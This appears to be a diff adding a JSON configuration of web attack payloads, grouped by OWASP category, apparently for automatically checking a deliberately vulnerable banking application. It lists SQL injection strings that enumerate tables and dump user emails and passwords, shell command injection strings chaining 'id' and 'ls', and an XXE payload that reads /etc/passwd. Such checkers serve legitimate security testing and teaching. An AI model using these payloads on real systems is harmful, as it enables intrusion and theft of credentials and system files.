@@ -1,0 +1,86 @@
+[
+    {
+        "category": "A03",
+        "vulnerabilities": [
+            {
+                "name": "Injection SQL",
+                "endPoint": "api/account",
+                "payloads": [
+                    {
+                        "payload": "1 OR '1'='1'",
+                        "regex": ".*idAccount.*",
+                        "method": "GET"
+                    },
+                    {
+                        "payload": "1 OR 1 order by 1",
+                        "regex": ".*idAccount.*",
+                        "method": "GET"
+                    },
+                    {
+                        "payload": "-1 union select 1,'2',3,4,'5'",
+                        "regex": ".*idAccount\":1.*",
+                        "method": "GET"
+                    },
+                    {
+                        "payload": "-1 union select 1,TABLE_NAME,3,4,'5' from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG=database() and TABLE_TYPE='TABLE'",
+                        "regex": ".*type\":\"USERS_ROLES\".*",
+                        "method": "GET"
+                    },
+                    {
+                        "payload": "-1 union select 1,COLUMN_NAME,3,4,'5' from INFORMATION_SCHEMA.COLUMNS where TABLE_CATALOG=database() and TABLE_NAME='USER'",
+                        "regex": ".*type\":\"SECRET_ANSWER\".*",
+                        "method": "GET"
+                    },
+                    {
+                        "payload": "-1 union select 1,EMAIL,3,4,PASSWORD from USER",
+                        "regex": ".*\"document\":\".*hellokitty\".*",
+                        "method": "GET"
+                    }
+                ]
+            },
+            {
+                "name": "Injection de commande",
+                "endPoint": "api/pdf/search",
+                "payloads": [
+                    {
+                        "payload": "*;id;ls ",
+                        "regex": ".*uid=.*gid=.*",
+                        "method": "GET"
+                    },
+                    {
+                        "payload": "13 || id || ls ",
+                        "regex": ".*uid=.*gid=.*",
+                        "method": "GET"
+                    },
+                    {
+                        "payload": "rib1.pdf && id && ls ",
+                        "regex": ".*uid=.*gid=.*",
+                        "method": "GET"
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "category": "A04",
+        "vulnerabilities": [
+            {
+                "name": "XXE",
+                "endPoint": "api/account",
+                "payloads": [
+                    {
+                        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:////etc/passwd\" >]><account><idAccount>99799</idAccount><type>Compte courant</type><balance>400</balance><rate>5</rate><document>&xxe;</document></account>",
+                        "regex": ".*root.*bin.*",
+                        "exceptions": [
+                            {
+                                "name": ".*JSON parse error: Undeclared general entity.*"
+                            }
+                        ],
+                        "method": "POST",
+                        "isHtml": false
+                    }
+                ]
+            }
+        ]
+    }
+]
